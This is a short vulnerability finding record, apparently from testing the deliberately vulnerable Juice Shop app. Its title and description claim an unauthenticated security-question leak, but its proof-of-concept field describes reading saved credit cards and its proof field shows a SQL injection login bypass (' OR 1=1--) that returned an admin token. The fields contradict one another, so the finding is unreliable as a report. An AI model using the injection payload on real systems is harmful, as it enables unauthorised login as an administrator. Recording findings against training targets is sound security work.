title: Security Question Exposed for Any User Email
description: The /rest/user/security-question endpoint leaks the security question for any registered user's email without requiring authentication. This facilitates brute-force attacks on password reset by allowing attackers to know the question before attempting to answer it.
poc: GET /api/Cards with admin JWT returns all saved credit cards (partially masked)
proof: POST with payload {"email":"' OR 1=1--","password":"test"} returned 200 with body containing "authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9..."} and "umail":"admin@juice-sh.op"
